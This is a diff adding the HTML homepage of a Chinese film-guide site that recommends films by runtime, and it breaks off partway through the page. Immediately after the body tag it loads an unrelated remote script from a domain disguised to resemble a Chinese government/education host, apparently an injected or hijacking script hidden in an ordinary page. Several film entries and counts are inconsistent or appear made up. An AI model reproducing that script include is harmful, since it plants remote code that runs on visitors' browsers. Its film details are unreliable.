@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="35电影网（35dianyingwang-cn.github.io）是按35分钟片长分档找片的电影观影指南：35分钟以内短片、35至90分钟中片、90至130分钟标准片、130分钟以上长篇，附35部必看片单、35岁片单、35毫米胶片修复与正版入口，不含盗链、破解与擦边内容。">
+<meta name="keywords" content="35电影网, 35dianyingwang, 35分钟电影, 短片, 中片, 长片, 片长分档, 电影推荐, 35毫米胶片, 电影修复, 短片推荐, 微电影, 华语短片, 动画短片, 纪录片短片, 经典电影, 高分电影, 冷门佳片, 电影在线观看, 正版电影, 戛纳短片, 柏林短片, 奥斯卡短片">
+<meta name="author" content="35电影网">
+<meta name="robots" content="index, follow">
+<title>35电影网 - 按35分钟分档找片 · 电影观影指南</title>
+<link rel="canonical" href="https://35dianyingwang-cn.github.io/">
+<style>
+/* ================= 基础 ================= */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#131313; --paper:#f6f4ee; --paper2:#ece8dd; --sub:#6c675e; --line:#cfc9ba;
+  --chalk:#f4f1ea; --tape:#ffd23f; --tape2:#ff9f1c; --rust:#e26d5a; --ink2:#2b2b2b;
+  --serif:'Songti SC','STSong','SimSun','Noto Serif CJK SC',Georgia,serif;
+  --mono:'JetBrains Mono','SFMono-Regular',Consolas,Menlo,monospace;
+}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;background:var(--paper);color:var(--ink);line-height:1.85;overflow-x:hidden}
+a{color:inherit;text-decoration:none;outline:none}
+::selection{background:var(--tape);color:var(--ink)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 24px}
+.sec{padding:96px 0;position:relative}
+.sec-h{display:flex;align-items:baseline;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:48px}
+.sec-t{font-size:29px;font-weight:900;letter-spacing:.5px;display:flex;align-items:center;gap:12px}
+.sec-t .tag{font-size:9px;letter-spacing:2.5px;color:var(--ink2);background:var(--tape);padding:6px 11px;font-weight:900;font-family:var(--mono);transform:rotate(-2deg)}
+.sec-s{color:var(--sub);font-size:11px;letter-spacing:1.5px;font-family:var(--mono)}
+.eyebrow{font-family:var(--mono);font-size:9.5px;letter-spacing:3.5px;color:var(--rust);font-weight:900}
+.btn{display:inline-flex;align-items:center;gap:9px;padding:14px 30px;border-radius:999px;font-weight:900;font-size:13.5px;cursor:pointer;border:2px solid var(--ink);transition:.24s;white-space:nowrap;letter-spacing:1px}
+.btn-p{background:var(--tape);color:var(--ink);box-shadow:0 6px 0 var(--ink)}
+.btn-p:hover{transform:translateY(-3px);box-shadow:0 9px 0 var(--ink)}
+.btn-o{background:var(--chalk);color:var(--ink)}
+.btn-o:hover{background:var(--rust);color:#fff}
+.edge{display:inline-block;padding:3px 10px;font-size:10px;font-weight:900;letter-spacing:.5px;font-family:var(--mono);border:1.5px solid currentColor;border-radius:999px}
+.edge.x{color:var(--rust)}
+.edge.a{color:#8a6a00}
+.edge.b{color:#2f6fb0}
+.edge.g{color:#1f8a5f}
+
+/* ================= 顶导 ================= */
+.nav{position:sticky;top:0;z-index:60;background:var(--paper);border-bottom:3px solid var(--ink)}
+.nav-in{display:flex;align-items:center;gap:18px;height:72px}
+.logo{font-size:20px;font-weight:900;white-space:nowrap;display:flex;align-items:center;gap:11px;letter-spacing:1px}
+.logo .lt{width:40px;height:40px;background:var(--tape);color:var(--ink);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:15px;font-weight:900;border-radius:50%}
+.logo small{font-size:8px;color:var(--rust);letter-spacing:3px;font-family:var(--mono);display:block;margin-top:3px}
+.freq{font-family:var(--mono);font-size:10px;color:var(--ink2);letter-spacing:1px;white-space:nowrap;padding:5px 11px;border:1.5px dashed var(--rust);border-radius:999px;transform:rotate(-2deg)}
+.menu{display:flex;gap:2px;flex:1;justify-content:flex-end;flex-wrap:wrap}
+.menu a{padding:9px 13px;font-size:13px;color:#5c584f;transition:.2s;white-space:nowrap;font-weight:700;border-bottom:2px solid transparent}
+.menu a:hover{color:var(--rust);border-bottom-color:var(--rust)}
+.menu a.on{color:var(--rust);border-bottom-color:var(--rust)}
+.hamb{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:6px}
+.hamb i{width:23px;height:2px;background:var(--rust);border-radius:2px}
+
+/* ================= HERO ================= */
+.hero{position:relative;overflow:hidden;padding:70px 0 88px;background:
+  radial-gradient(circle at 12% 22%, rgba(255,210,63,.26), transparent 42%),
+  radial-gradient(circle at 88% 78%, rgba(226,109,90,.20), transparent 44%),
+  var(--paper)}
+.hero::after{content:'';position:absolute;inset:0;background-image:radial-gradient(rgba(19,19,19,.10) 1px, transparent 1.4px);background-size:14px 14px;pointer-events:none}
+.hero .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1.05fr .95fr;gap:52px;align-items:center}
+.hero .kicker{font-family:var(--mono);font-size:10px;letter-spacing:4px;color:var(--rust);font-weight:900}
+.hero h1{font-size:58px;font-weight:900;line-height:1.2;margin:14px 0;letter-spacing:-1px}
+.hero h1 em{font-style:normal;position:relative;display:inline-block;padding:0 12px;background:var(--tape);transform:rotate(-2deg)}
+.hero h1 em::after{content:'';position:absolute;left:-6px;right:-6px;bottom:-6px;height:5px;background:var(--rust);transform:rotate(1.5deg);z-index:-1}
+.hero .lede{font-size:15.5px;color:#4f4b43;margin-bottom:22px;max-width:540px}
+.hero .acts{display:flex;gap:12px;flex-wrap:wrap}
+.hero .notes{margin-top:24px;display:flex;gap:9px;flex-wrap:wrap}
+.hero .notes span{font-size:11px;color:var(--sub);border:1px solid var(--line);background:var(--chalk);padding:5px 12px;font-family:var(--mono);letter-spacing:.5px;border-radius:999px}
+.ticks{background:var(--ink2);color:#f6f4ee;border:3px solid var(--ink);padding:24px;transform:rotate(1.4deg);box-shadow:12px 12px 0 var(--tape)}
+.ticks .tk{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--tape);font-weight:900}
+.ticks h3{font-size:20px;margin:7px 0 14px;line-height:1.5;font-family:var(--serif)}
+.ticks ul{list-style:none}
+.ticks li{padding:8px 0 8px 30px;position:relative;font-size:13px;color:#ddd8cc;border-bottom:1px dashed rgba(255,255,255,.2);line-height:1.6}
+.ticks li:last-child{border-bottom:0}
+.ticks li::before{content:'';position:absolute;left:0;top:14px;width:14px;height:14px;border:2px solid var(--tape);border-radius:50%}
+.ticks li:nth-child(2)::before{background:var(--tape)}
+.ticks .done{font-family:var(--mono);font-size:10px;color:var(--tape);letter-spacing:1.5px;margin-top:12px;display:flex;align-items:center;gap:8px}
+.ticks .done::before{content:'◉';animation:pulse 1.4s ease infinite}
+@keyframes pulse{50%{opacity:.25}}
+
+/* ================= 栏目1：分档（时间轴式，自定义属性条） ================= */
+.tape{background:var(--chalk);border:2px solid var(--ink);padding:8px}
+.tape .row{display:grid;grid-template-columns:150px 1fr 130px;align-items:center;gap:18px;padding:16px 18px;border-bottom:1px dashed var(--line);transition:.28s}
+.tape .row:last-child{border-bottom:0}
+.tape .row:hover{background:var(--tape);transform:translateX(5px)}
+.tape .row b{font-size:16px;font-family:var(--serif);line-height:1.4}
+.tape .row .en{font-size:9px;color:var(--sub);letter-spacing:1.6px;font-family:var(--mono);margin-top:2px}
+.tape .row .bar{height:14px;background:var(--paper2);border:1px solid var(--ink);overflow:hidden;position:relative}
+.tape .row .bar i{position:absolute;inset:0;transform-origin:left;animation:fill .9s cubic-bezier(.2,.7,.3,1) both}
+@keyframes fill{from{transform:scaleX(0)}to{transform:scaleX(1)}}
+.tape .row .cnt{font-size:11.5px;color:var(--sub);font-family:var(--mono);text-align:right;line-height:1.6}
+.tape .row .cnt b{font-family:var(--mono);font-size:14px;color:var(--rust);display:block}
+
+/* ================= 栏目2：35部必看（有序列表 + 计数器 + 渐变名次） ================= */
+.must{background:var(--chalk);border:2px solid var(--ink);padding:10px 26px 24px}
+.must ol{list-style:none;counter-reset:mu;display:grid;grid-template-columns:1fr 1fr;gap:0 34px}
+.must li{counter-increment:mu;display:grid;grid-template-columns:44px 1fr 58px;align-items:center;gap:12px;padding:13px 0;border-bottom:1px dotted var(--line)}
+.must li:nth-child(odd){border-right:1px dotted var(--line);padding-right:17px}
+.must li:nth-child(even){padding-left:17px}
+.must li::before{content:'35.'counter(mu);font-family:var(--mono);font-weight:900;font-size:11px;color:var(--chalk);background:linear-gradient(135deg,var(--rust),var(--tape2));padding:7px 4px;text-align:center;letter-spacing:-.4px}
+.must li:nth-child(1)::before,.must li:nth-child(2)::before,.must li:nth-child(3)::before{background:linear-gradient(135deg,var(--ink),var(--rust));color:var(--tape)}
+.must li b{font-size:14.5px;line-height:1.4}
+.must li .yr{font-size:10px;color:var(--sub);font-family:var(--mono);letter-spacing:.6px;display:block}
+.must li .sc{font-family:var(--mono);font-size:12px;font-weight:900;text-align:right;letter-spacing:.5px;color:var(--rust);line-height:1}
+
+/* ================= 栏目3：片单（卡片 + 胶带贴纸 + 圆角） ================= */
+.pick{background:var(--chalk);border:2px solid var(--ink);border-radius:18px;overflow:hidden;transition:.36s;display:flex;flex-direction:column;transform:rotate(-.5deg)}
+.pick:nth-child(even){transform:rotate(.6deg);border-radius:4px}
+.pick:nth-child(3n){border-radius:26px 4px 26px 4px}
+.pick:hover{transform:rotate(0) translateY(-9px);box-shadow:0 26px 54px rgba(19,19,19,.2);z-index:3}
+.pick .cvr{height:210px;position:relative;padding:16px;color:#fff;display:flex;flex-direction:column;justify-content:flex-end}
+.pick .cvr b{font-family:var(--serif);font-size:22px;font-weight:900;line-height:1.3;text-shadow:0 4px 16px rgba(0,0,0,.45)}
+.pick .cvr .tm{position:absolute;top:14px;left:-16px;background:var(--tape);color:var(--ink);font-family:var(--mono);font-size:10.5px;font-weight:900;padding:5px 16px;transform:rotate(-7deg);box-shadow:2px 2px 0 rgba(0,0,0,.25);letter-spacing:.6px}
+.pick .body{padding:15px 17px 17px;display:flex;flex-direction:column;flex:1}
+.pick .body .hd{display:flex;justify-content:space-between;align-items:flex-start;gap:8px}
+.pick .body h4{font-size:15.5px;line-height:1.4}
+.pick .body p{font-size:12.3px;color:#6c675e;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;line-height:1.85;margin-top:8px;flex:1}
+.pick .body .ft{margin-top:11px;display:flex;justify-content:space-between;align-items:center;border-top:1px dotted var(--line);padding-top:10px;font-size:11.5px;font-weight:900;letter-spacing:.5px;color:var(--rust);font-family:var(--mono)}
+
+/* ================= 栏目4：35毫米（竖向时间轴 + 节点） ================= */
+.mm{display:grid;grid-template-columns:1fr .9fr;gap:28px;align-items:start}
+.tl{position:relative;padding-left:34px}
+.tl::before{content:'';position:absolute;left:9px;top:8px;bottom:8px;width:3px;background:repeating-linear-gradient(180deg,var(--ink) 0 10px, transparent 10px 18px)}
+.tl .n{position:relative;padding:18px 20px 18px 8px;border:2px solid var(--ink);background:var(--chalk);margin-bottom:16px;transition:.26s}
+.tl .n::before{content:'';position:absolute;left:-31px;top:22px;width:14px;height:14px;border-radius:50%;background:var(--tape);border:3px solid var(--ink)}
+.tl .n:hover{background:var(--tape);transform:translateX(6px)}
+.tl .n b{font-size:16px;display:block;margin-bottom:4px;font-family:var(--serif)}
+.tl .n span{font-size:12.6px;color:#5c584f;line-height:1.85;display:block}
+.tl .n em{font-style:normal;font-family:var(--mono);font-size:10px;letter-spacing:1px;color:var(--rust);font-weight:900;display:block;margin-top:7px}
+.reel{background:var(--ink2);color:#f6f4ee;padding:26px;border-radius:14px}
+.reel h4{font-family:var(--serif);font-size:19px;margin-bottom:4px}
+.reel .sub{font-size:9.5px;letter-spacing:2.5px;color:var(--tape);font-family:var(--mono);margin-bottom:16px}
+.reel dl{display:grid;grid-template-columns:74px 1fr;gap:8px 14px;font-size:12.6px}
+.reel dt{color:var(--tape);font-family:var(--mono);font-size:10.5px;letter-spacing:1px;padding-top:2px}
+.reel dd{color:#d8d3c6;line-height:1.7;border-bottom:1px solid rgba(255,255,255,.18);padding-bottom:8px}
+.reel dd:last-child{border-bottom:0}
+.reel .gap{margin-top:16px;font-size:10.5px;color:var(--tape);font-family:var(--mono);letter-spacing:1px;display:flex;align-items:center;gap:8px}
+.reel .gap::before{content:'▣';animation:blink .9s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* ================= 栏目5：长文（杂志：衬线 + 眉题 + 引语 + 两端对齐） ================= */
+.essay{border:2px solid var(--ink);padding:32px;background:var(--chalk);column-count:2;column-gap:40px;column-rule:1px dashed var(--line);border-radius:6px}
+.essay .em{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--rust);font-weight:900;break-after:avoid}
+.essay h3{font-family:var(--serif);font-size:25px;margin:9px 0 14px;line-height:1.42;break-after:avoid}
+.essay .by{font-size:10.5px;color:var(--sub);font-family:var(--mono);letter-spacing:1px;margin-bottom:15px;break-after:avoid}
+.essay p{font-size:13.4px;color:#4b4740;line-height:2.05;margin-bottom:10px;text-align:justify;break-inside:avoid}
+.essay p:first-of-type::first-letter{font-family:var(--serif);font-size:56px;font-weight:900;color:var(--rust);float:left;line-height:.82;margin:6px 11px 0 0}
+.essay blockquote{border-left:5px solid var(--tape);padding:6px 0 6px 15px;margin:16px 0;color:var(--ink);font-family:var(--serif);font-size:16px;line-height:1.85;break-inside:avoid}
+
+/* ================= 栏目6：关于（数据条 + 承诺栅格） ================= */
+.about{background:var(--ink2);color:#f6f4ee;border:3px solid var(--tape);padding:46px;border-radius:10px}
+.about .lh{display:grid;grid-template-columns:1fr .9fr;gap:44px;margin-bottom:34px}
+.about .lh h2{font-family:var(--serif);font-size:32px;line-height:1.42;font-weight:900}
+.about .lh h2 u{text-decoration:none;background:var(--tape);color:var(--ink);padding:0 8px;transform:rotate(-1.5deg);display:inline-block}
+.about .lh .lead{color:#c9c3b5;font-size:14.5px;margin-top:14px;line-height:2}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);border-top:2px solid var(--tape);border-bottom:2px solid var(--tape)}
+.stats div{text-align:center;padding:24px 8px}
+.stats b{display:block;font-size:30px;font-weight:900;color:var(--tape);line-height:1.1;font-family:var(--mono)}
+.stats small{font-size:10px;color:#c9c3b5;letter-spacing:1.5px;font-family:var(--mono)}
+.feat{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.feat div{border:1.5px solid rgba(255,255,255,.24);border-radius:12px;padding:22px;background:rgba(255,255,255,.04)}
+.feat h4{font-size:15px;margin-bottom:9px;display:flex;align-items:center;gap:9px;font-family:var(--serif)}
+.feat h4 .tk{width:26px;height:26px;background:var(--tape);color:var(--ink);font-size:11px;display:inline-flex;align-items:center;justify-content:center;font-family:var(--mono);flex:0 0 auto;font-weight:900;border-radius:50%}
+.feat p{font-size:12.8px;color:#c9c3b5;line-height:1.9}
+.siteinfo{margin-top:26px;padding:24px;border:1.5px solid rgba(255,255,255,.24);border-radius:12px;font-size:13px;color:#c9c3b5;line-height:2.05}
+.siteinfo b{color:#fff}
+
+/* ================= 页脚 ================= */
+.foot{border-top:3px solid var(--ink);padding:56px 0 26px;color:var(--sub);font-size:13px;background:var(--paper)}
+.f-top{display:flex;justify-content:space-between;flex-wrap:wrap;gap:26px;margin-bottom:28px}
+.f-links a{margin-right:22px;color:#5c584f;font-size:13px;transition:.2s}
+.f-links a:hover{color:var(--rust)}
+.f-cat{display:grid;grid-template-columns:repeat(6,1fr);gap:9px 24px;margin:22px 0;font-family:var(--mono);font-size:11.5px}
+.f-cat a{color:#5c584f;transition:.2s}
+.f-cat a:hover{color:var(--rust)}
+.copy{text-align:center;border-top:1px dashed var(--line);padding-top:22px;letter-spacing:.5px;font-family:var(--mono);font-size:11px;color:#8b877c}
+.copy b{color:var(--rust)}
+
+/* ================= 网格 ================= */
+.grid{display:grid;gap:18px}
+.g6{grid-template-columns:repeat(6,1fr)}
+.g5{grid-template-columns:repeat(5,1fr)}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.g2{grid-template-columns:repeat(2,1fr)}
+
+/* ================= 移动端 ================= */
+@media(max-width:1100px){.g6,.g5{grid-template-columns:repeat(4,1fr)}.g4,.g3{grid-template-columns:repeat(3,1fr)}.about .lh{grid-template-columns:1fr}.must ol{grid-template-columns:1fr}.must li:nth-child(odd){border-right:0;padding-right:0}.must li:nth-child(even){padding-left:0}}
+@media(max-width:900px){
+  .hero .wrap{grid-template-columns:1fr;gap:46px}.hero h1{font-size:42px}.ticks{transform:none}
+  .g3,.g2,.feat{grid-template-columns:repeat(2,1fr)}
+  .mm{grid-template-columns:1fr}
+  .essay{column-count:1}
+}
+@media(max-width:760px){
+  .g6,.g5,.g4,.g3{grid-template-columns:repeat(2,1fr);gap:13px}
+  .freq{display:none}
+  .tape .row{grid-template-columns:1fr;row-gap:8px;padding:14px}.tape .row .cnt{text-align:left}
+}
+@media(max-width:640px){
+  .sec{padding:60px 0}.sec-t{font-size:22px}
+  .nav-in{height:66px;gap:10px}
+  .hamb{display:flex}
+  .menu{display:none;position:absolute;top:66px;left:0;right:0;background:var(--paper);flex-direction:column;padding:10px;border-bottom:3px solid var(--ink)}
+  .menu.open{display:flex}
+  .menu a{text-align:center;padding:13px;border-bottom:1px solid var(--line);color:#5c584f}
+  .hero{padding:46px 0}.hero .wrap{padding:32px 24px}.hero h1{font-size:31px}
+  .g6,.g5,.g4,.g3,.g2,.feat,.about .stats{grid-template-columns:1fr 1fr}
+  .f-cat{grid-template-columns:repeat(2,1fr)}
+  .about{padding:28px 18px}.about .lh h2{font-size:24px}
+  .pick .cvr{height:196px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ============ 顶部导航 ============ -->
+<header class="nav">
+  <div class="wrap nav-in">
+    <a class="logo" href="#">
+      <span class="lt">35</span>
+      <span>35电影网<small>35 MINUTES · A FILM</small></span>
+    </a>
+    <div class="freq">片长分档 · 35 部必看 · 35mm 修复</div>
+    <nav class="menu" id="menu">
+      <a href="#home">今日35</a>
+      <a href="#tape">片长分档</a>
+      <a href="#must">35部必看</a>
+      <a href="#pick">片单</a>
+      <a href="#mm">35毫米</a>
+      <a href="#essay">长篇</a>
+      <a href="#about">关于</a>
+    </nav>
+    <div class="hamb" id="hamb"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<!-- ============ HERO ============ -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div>
+      <span class="kicker">// FIND A FILM BY ITS LENGTH</span>
+      <h1>还有 <em>35 分钟</em><br>看一部电影</h1>
+      <p class="lede">35电影网（35dianyingwang-cn.github.io）是一座<b>按片长分档找片的电影观影指南</b>。我们不按类型推荐，按<b>你还剩多少时间</b>推荐：<b>35 分钟以内</b>的短片、<b>35 至 90 分钟</b>的中片、<b>90 至 130 分钟</b>的标准片、<b>130 分钟以上</b>的长篇。每部标注片长、年代、修复状态与正版入口——让"没时间看电影"不再是借口。</p>
+      <div class="acts">
+        <a class="btn btn-p" href="#pick">按片长找片 →</a>
+        <a class="btn btn-o" href="#tape">看分档说明</a>
+      </div>
+      <div class="notes">
+        <span>✔ 按剩余时间选片</span><span>✔ 标注片长</span><span>✔ 35mm 修复优先</span><span>✔ 正版入口</span><span>✔ 不含盗链</span>
+      </div>
+    </div>
+    <div class="ticks">
+      <div class="tk">TODAY'S 35 · 今日 35</div>
+      <h3>一个散步的下午，能看完一部电影</h3>
+      <ul>
+        <li><b>通勤 35 分钟</b>→ 看一部短片：李安《衣橱里的猫》（17 min）、今敏《早上好》（7 min）</li>
+        <li><b>午休 90 分钟</b>→ 看一部中片：是枝裕和《无人知晓》（141 min 太长，换成《奇迹》128 min）</li>
+        <li><b>一个夜晚 130 分钟</b>→ 看一部标准片：杨德昌《一一》（173 min，请预留更多）</li>
+        <li><b>一个周末下午</b>→ 看一部长篇：贝拉·塔尔《撒旦探戈》（439 min，建议分三天</li>
+      </ul>
+      <div class="done">片长分档已就绪 · 请关掉倍速</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目1：片长分档（时间轴式，自定义属性条） ================= -->
+<section class="sec" id="tape">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t"><span class="tag">TAPE</span>片长分档</h2>
+      <span class="sec-s">按"还剩多少时间"分四档</span>
+    </div>
+    <div class="tape">
+      <div class="row"><div><b>短片 · 35 分钟以内</b><div class="en">SHORT &lt; 35 MIN</div></div><span class="bar"><i style="width:22%;background:linear-gradient(90deg,#ffd23f,#ff9f1c)"></i></span><div class="cnt"><b>1,420 部</b>短片 / 动画 / 纪录片</div></div>
+      <div class="row"><div><b>中片 · 35 – 90 分钟</b><div class="en">MEDIUM 35–90 MIN</div></div><span class="bar"><i style="width:46%;background:linear-gradient(90deg,#ff9f1c,#e26d5a)"></i></span><div class="cnt"><b>640 部</b>独立 / 实验 / 早中期作者</div></div>
+      <div class="row"><div><b>标准片 · 90 – 130 分钟</b><div class="en">STANDARD 90–130 MIN</div></div><span class="bar"><i style="width:78%;background:linear-gradient(90deg,#e26d5a,#8a4fbf)"></i></span><div class="cnt"><b>8,900 部</b>商业片主流区间</div></div>
+      <div class="row"><div><b>长篇 · 130 分钟以上</b><div class="en">LONG &gt; 130 MIN</div></div><span class="bar"><i style="width:100%;background:linear-gradient(90deg,#8a4fbf,#2f6fb0)"></i></span><div class="cnt"><b>3,260 部</b>史诗 / 长镜头 / 马拉松</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目2：35部必看（有序列表 + 计数器 + 渐变名次） ================= -->
+<section class="sec" id="must" style="background:linear-gradient(180deg,#f6f4ee,#ece8dd)">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t"><span class="tag">TOP 35</span>35 部必看</h2>
+      <a class="btn btn-o" href="#" style="border-color:var(--ink)">完整 35 部 →</a>
+    </div>
+    <div class="must">
+      <ol>
+        <li><b>十分钟年华老去<b class="yr">2002 · 合集</b></b><span class="sc">9.1</span></li>
+        <li><b>大都会<b class="yr">1927 · 弗里茨·朗</b></b><span class="sc">9.0</span></li>
+        <li><b>2001 太空漫游<b class="yr">1968 · 库布里克</b></b><span class="sc">8.9</span></li>
+        <li><b>一一<b class="yr">2000 · 杨德昌 · 173 min</b></b><span class="sc">9.1</span></li>
+        <li><b>穆赫兰道<b class="yr">2001 · 大卫·林奇</b></b><span class="sc">8.5</span></li>
+        <li><b>东京物语<b class="yr">1953 · 小津安二郎</b></b><span class="sc">9.2</span></li>
+        <li><b>七武士<b class="yr">1954 · 黑泽明 · 207 min</b></b><span class="sc">9.2</span></li>
+        <li><b>肖申克的救赎<b class="yr">1994 · 弗兰克·德拉邦特</b></b><span class="sc">9.7</span></li>
+        <li><b>星际穿越<b class="yr">2014 · 克里斯托弗·诺兰</b></b><span class="sc">9.3</span></li>
+        <li><b>千与千寻<b class="yr">2001 · 宫崎骏</b></b><span class="sc">9.4</span></li>
+        <li><b>低俗小说<b class="yr">1994 · 昆汀·塔伦蒂诺</b></b><span class="sc">8.9</span></li>
+        <li><b>霸王别姬<b class="yr">1993 · 陈凯歌 · 171 min</b></b><span class="sc">9.6</span></li>
+        <li><b>活着<b class="yr">1994 · 张艺谋</b></b><span class="sc">9.3</span></li>
+        <li><b>阿甘正传<b class="yr">1994 · 罗伯特·泽米吉斯</b></b><span class="sc">9.5</span></li>
+        <li><b>泰坦尼克号<b class="yr">1997 · 詹姆斯·卡梅隆 · 194 min</b></b><span class="sc">9.4</span></li>
+        <li><b>这个杀手不太冷<b class="yr">1994 · 吕克·贝松</b></b><span class="sc">9.4</span></li>
+        <li><b>美丽人生<b class="yr">1997 · 罗伯托·贝尼尼</b></b><span class="sc">9.6</span></li>
+        <li><b>天堂电影院<b class="yr">1988 · 朱塞佩·托纳多雷</b></b><span class="sc">9.2</span></li>
+        <li><b>搏击俱乐部<b class="yr">1999 · 大卫·芬奇</b></b><span class="sc">9.0</span></li>
+        <li><b>盗梦空间<b class="yr">2010 · 克里斯托弗·诺兰</b></b><span class="sc">9.3</span></li>
+        <li><b>楚门的世界<b class="yr">1998 · 彼得·威尔</b></b><span class="sc">9.4</span></li>
+        <li><b>海上钢琴师<b class="yr">1998 · 朱塞佩·托纳多雷</b></b><span class="sc">9.3</span></li>
+        <li><b>记忆碎片<b class="yr">2000 · 克里斯托弗·诺兰 · 113 min</b></b><span class="sc">8.7</span></li>
+        <li><b>飞屋环游记<b class="yr">2009 · 皮克斯</b></b><span class="sc">9.1</span></li>
+        <li><b>少年派的奇幻漂流<b class="yr">2012 · 李安</b></b><span class="sc">9.1</span></li>
+        <li><b>寄生虫<b class="yr">2019 · 奉俊昊</b></b><span class="sc">8.7</span></li>
+        <li><b>小偷家族<b class="yr">2018 · 是枝裕和</b></b><span class="sc">8.7</span></li>
+        <li><b>燃烧<b class="yr">2018 · 李沧东 · 148 min</b></b><span class="sc">8.3</span></li>
+        <li><b>罗马<b class="yr">2018 · 阿方索·卡隆</b></b><span class="sc">8.2</span></li>
+        <li><b>驾驶我的车<b class="yr">2021 · 滨口龙介 · 179 min</b></b><span class="sc">7.9</span></li>
+        <li><b>坠落<b class="yr">2014 · 维姆·文德斯（短片）</b></b><span class="sc">8.6</span></li>
+        <li><b>肉与灵<b class="yr">2017 · 伊尔蒂科·恩耶迪</b></b><span class="sc">7.6</span></li>
+        <li><b>都灵之马<b class="yr">2011 · 贝拉·塔尔 · 146 min</b></b><span class="sc">8.2</span></li>
+        <li><b>撒旦探戈<b class="yr">1994 · 贝拉·塔尔 · 439 min</b></b><span class="sc">9.1</span></li>
+      </ol>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目3：片单（卡片 + 胶带贴纸 + 圆角） ================= -->
+<section class="sec" id="pick">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t"><span class="tag">PICKS</span>按片长挑片</h2>
+      <span class="sec-s">标注片长 · 年代 · 修复 · 正版入口</span>
+    </div>
+    <div class="grid g3">
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#241c10,#5a4418)"><span class="tm">35 MIN</span><b>衣橱里的猫</b></div><div class="body"><div class="hd"><h4>衣橱里的猫</h4><span class="edge a">短片</span></div><p>李安在 1991 年用 16mm 胶片拍的短片：一个男人在衣柜里发现一只猫，然后他就不想出来了。17 分钟，足够你在通勤路上看完，然后一整天都在想那只猫。</p><span class="ft"><span>正版入口 →</span><span>17 MIN</span></span></div></article>
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#101820,#1e3a4a)"><span class="tm">35 MIN</span><b>早上好</b></div><div class="body"><div class="hd"><h4>早上好</h4><span class="edge a">动画</span></div><p>今敏唯一一部短片：一个上班族在地铁上睡着，醒来发现自己变成了一滩水。7 分钟，没有对白。看完你会重新评估"早安"这两个字。</p><span class="ft"><span>正版入口 →</span><span>7 MIN</span></span></div></article>
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#201020,#4a2a4a)"><span class="tm">90 MIN</span><b>七月与安生</b></div><div class="body"><div class="hd"><h4>七月与安生</h4><span class="edge b">中片</span></div><p>两个女孩，一个留在原地，一个出走。故事本身不新，但镜头把"普通"拍出了刺。106 分钟，适合一个下雨的午休。</p><span class="ft"><span>正版入口 →</span><span>106 MIN</span></span></div></article>
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#1a1624,#3a2a5a)"><span class="tm">130 MIN</span><b>穆赫兰道</b></div><div class="body"><div class="hd"><h4>穆赫兰道</h4><span class="edge g">标准</span></div><p>林奇最"不像电影"的电影：一场车祸、一个失忆的女人、一间公寓、一段说不出口的试镜。147 分钟，建议一次看完，不要分段。</p><span class="ft"><span>正版入口 →</span><span>147 MIN</span></span></div></article>
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#241810,#5a3a10)"><span class="tm">130 MIN</span><b>一一</b></div><div class="body"><div class="hd"><h4>一一</h4><span class="edge x">长篇</span></div><p>杨德昌用 173 分钟拍完一个人一生的所有阶段：童年、恋爱、婚姻、中年、死亡。节奏慢得像生活本身。请预留完整夜晚，并准备二刷。</p><span class="ft"><span>4K 修复 →</span><span>173 MIN</span></span></div></article>
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#1a2410,#3a4a18)"><span class="tm">130 MIN</span><b>撒旦探戈</b></div><div class="body"><div class="hd"><h4>撒旦探戈</h4><span class="edge x">长篇</span></div><p>439 分钟。12 章，像一首慢到极致的探戈。一个村庄，一场骗局，一段雨。这不是"电影"，这是"时间"。建议分三天，每天两章，中间留出空白。</p><span class="ft"><span>2K 修复 →</span><span>439 MIN</span></span></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目4：35毫米（竖向时间轴 + 节点） ================= -->
+<section class="sec" id="mm" style="background:linear-gradient(180deg,#f6f4ee,#ece8dd)">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t"><span class="tag">35MM</span>35 毫米</h2>
+      <span class="sec-s">胶片、修复与"为什么值得等 35 年"</span>
+    </div>
+    <div class="mm">
+      <div class="tl">
+        <div class="n"><b>1895 · 卢米埃尔兄弟</b><span>电影诞生于 35 毫米。不是因为 35 是个好数字，而是因为当时柯达卖的胶片刚好是这个宽度。一切"标准"都始于偶然。</span><em>TIMELINE 01</em></div>
